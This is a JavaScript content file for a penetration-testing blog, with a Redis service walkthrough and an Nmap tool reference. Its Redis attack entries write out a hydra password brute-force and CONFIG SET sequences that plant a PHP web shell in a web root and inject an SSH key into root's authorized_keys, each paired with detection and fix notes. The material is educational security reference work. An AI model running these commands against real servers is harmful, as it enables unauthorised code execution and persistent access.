/**
 * Reference example for the tactics content files.
 *
 * Every tactics page is rendered from this shape by:
 *   - src/blog/pages/ServiceTactics.jsx  (protocol / service walkthroughs)
 *   - src/blog/pages/ToolTactics.jsx     (tool reference pages)
 *
 * Rules for authoring entries:
 *
 *  1. Original wording. The structure mirrors how published pentesting
 *     references are organised, but every sentence here is written for
 *     this site.
 *  2. Every command must be something you would actually type. Use
 *     <target> as the placeholder for a host and <ip> for a single host.
 *  3. Every attack vector carries a severity and a `detection` line:
 *     what the defender would see in their logs.
 *  4. Every attack vector carries a `fix` line: the remediation.
 *  5. Never show exploitation of a system the reader does not own. The
 *     scope banner on the rendered page carries this message too.
 */

/* ------------------------------------------------------------------ */
/* SERVICE / PROTOCOL                                                  */
/* ------------------------------------------------------------------ */

export const services = [
  {
    slug: "redis",
    name: "Redis",
    port: 6379,
    protocol: "tcp",
    risk: "critical",
    tags: ["database", "cache", "in-memory"],
    summary:
      "Redis is an in-memory key-value store used as a cache, a session store and, far too often, as the only copy of the data. It ships with a text protocol that is trivially scriptable, and the default configuration has no authentication at all — which turns a forgotten bind address into a full database compromise.",
    connect: [
      {
        label: "redis-cli",
        command: "redis-cli -h <target> -p 6379",
      },
      {
        label: "Connection URL",
        command: "redis://:<password>@<host>:6379",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 6379 --script redis-info <target>",
        detail:
          "The redis-info script returns the version, memory limits, role and whether the server is in protected mode. A version and a role are enough to pick the next step.",
      },
      {
        title: "Banner grab",
        command: "printf 'PING\\r\\n' | nc -nv <target> 6379",
        detail:
          "Redis answers with +PONG on a working unauthenticated instance. If the socket closes immediately, the server requires a password.",
      },
    ],
    enumeration: [
      {
        title: "Server information",
        command: "redis-cli -h <target> INFO",
        detail:
          "Read redis_version, role, connected_clients, db0:keys and used_memory_human. A non-zero key count on a cache node usually means the cache is the database.",
      },
      {
        title: "Key inventory",
        command: "redis-cli -h <target> --scan --pattern '*' | head -50",
        detail:
          "SCAN is safe on a live server where KEYS is not. The key names alone frequently disclose the shape of the application.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated access",
        severity: "critical",
        command: "redis-cli -h <target> INFO",
        detail:
          "If the server replies without credentials, every key is readable and every key is writable. There is no further barrier.",
        detection:
          "Check for INFO, CONFIG GET and SCAN arriving on port 6379 from a host that does not host the application.",
        fix: "Set requirepass, bind to a private interface and front the service with TLS.",
      },
      {
        title: "Weak or default credentials",
        severity: "high",
        command: "hydra -l '' -P /usr/share/wordlists/redis-pass.txt <target> redis",
        detail:
          "A short password on a service that has no rate limiting is an offline problem for the attacker.",
        detection: "Alert on repeated authentication failures on the Redis port.",
        fix: "Use a long generated password and rotate it through a secret store.",
      },
    ],
    postEx: [
      {
        title: "Write a web shell through CONFIG SET",
        severity: "critical",
        command:
          "redis-cli -h <target> CONFIG SET dir /var/www/html\nredis-cli -h <target> CONFIG SET dbfilename shell.php\nredis-cli -h <target> SET payload '<?php system($_GET[\"c\"]); ?>'\nredis-cli -h <target> SAVE",
        detail:
          "Redis writes its dataset to disk. Pointing dir at a web root and dbfilename at a served file turns the cache into remote code execution.",
        detection:
          "Files created under a web root with names matching dbfilename, and CONFIG SET arriving with a dir outside the data directory.",
        fix:
          "Rename the service account's shell, protect CONFIG with a rename-command block and never let the data directory be writable by the web server.",
      },
      {
        title: "SSH key injection",
        severity: "high",
        command:
          "redis-cli -h <target> CONFIG SET dir /root/.ssh\nredis-cli -h <target> CONFIG SET dbfilename authorized_keys\nredis-cli -h <target> SET payload \"$(cat ~/.ssh/id_rsa.pub)\"\nredis-cli -h <target> SAVE",
        detail:
          "The same write primitive lands in an SSH key file. Worth checking even when the web-root route is closed.",
        detection: "Any write to a path outside the configured data directory.",
        fix: "Restrict CONFIG, and monitor the data directory for new files.",
      },
    ],
    commands: [
      { command: "PING", description: "Liveness check. +PONG means the port is Redis." },
      { command: "INFO", description: "Server configuration, memory use, role and key counts." },
      { command: "KEYS *", description: "Every key. Fine on a lab, expensive in production." },
      { command: "SCAN 0", description: "Iterative key enumeration that does not block the server." },
      { command: "CONFIG GET *", description: "Runtime configuration, including dir and requirepass." },
      { command: "CONFIG SET dir <path>", description: "Sets the working directory for RDB and AOF writes." },
      { command: "SAVE / BGSAVE", description: "Forces a snapshot of the dataset to disk." },
      { command: "SLAVEOF <host> <port>", description: "Makes this node a replica of another — the basis of rogue-server attacks." },
      { command: "MODULE LOAD <path>", description: "Loads a shared object into the server process." },
      { command: "DEBUG OBJECT <key>", description: "Returns the internal encoding and serialised length of a key." },
    ],
    hardening: [
      {
        title: "Turn on authentication",
        detail:
          "Set requirepass to a long random value and use ACLs (user, on ~* +@all, off) so each application gets its own credential.",
      },
      {
        title: "Remove protected mode",
        detail:
          "Protected mode only blocks Redis when there is no password and no bind address. It is not a control; configure the binding instead.",
      },
      {
        title: "Restrict CONFIG",
        detail:
          "Rename CONFIG to a name the application does not know, or deny it in the ACL. CONFIG SET dir is the whole attack surface.",
      },
      {
        title: "Bind to a private interface",
        detail: "bind 127.0.0.1 on a single-host install, and never expose 6379 to the internet.",
      },
      {
        title: "Enable TLS",
        detail: "Use --tls with tls-port and tls-cert-file so credentials and data are not sent in clear text.",
      },
      {
        title: "Run as an unprivileged user",
        detail:
          "The service account should not be able to write to a web root or to any user's .ssh directory.",
      },
    ],
    tools: ["redis-cli", "nmap", "hydra", "metasploit", "netcat"],
  },
];

/* ------------------------------------------------------------------ */
/* TOOL                                                                */
/* ------------------------------------------------------------------ */

export const tools = [
  {
    slug: "nmap",
    name: "Nmap",
    category: "recon",
    summary:
      "The host and port scanner that every assessment starts with. Nmap is useful for far more than finding open ports: its NSE script library turns it into a protocol-aware prober for hundreds of services, and its NSE library is the difference between 'port 6379 is open' and 'Redis 6.2 with no password, here is the proof'.",
    install: [
      "apt update && apt install -y nmap",
      "brew install nmap",
      "pip install --user nmap  # wrapper only; the binary is still required",
    ],
    usage: [
      {
        title: "Service and version detection",
        command: "nmap -sV -sC -p- --open <target>",
        detail:
          "The -sC default script set covers the common cases. Expect it to take a while on a full port range; scope it if you can.",
      },
      {
        title: "Targeted script run",
        command: "nmap -p 6379 --script redis-info,redis-brute <target>",
        detail:
          "Running one script against one port is fast and leaves far less noise than a full sweep with default scripts.",
      },
      {
        title: "UDP scan",
        command: "nmap -sU --top-ports 50 --min-rate 1000 <target>",
        detail:
          "UDP scanning is slow because there is no handshake. --min-rate keeps it tolerable, and dropping --top-ports to the services you care about is usually the only sane approach on a real network.",
      },
      {
        title: "Timing-safe template scan",
        command: "nmap -T4 -p 1-10000 --min-rate 1000 <target>",
        detail:
          "-T4 is a reasonable compromise for a network you own. On shared or monitored links, slow down further.",
      },
    ],
    useCases: [
      "Port and service discovery on an authorised network",
      "Version fingerprinting to pick the right exploit path",
      "NSE scripts for protocol-specific enumeration",
      "UDP service discovery where a TCP sweep would miss everything",
    ],
    notes:
      "Run a SYN scan as a user with raw socket privileges (or with --sudo) for accurate results; without it, nmap falls back to a connect scan and tells you so. Version detection (-sV) sends extra probes and is the single biggest source of false positives — confirm before you act on a fingerprint.",
  },
];
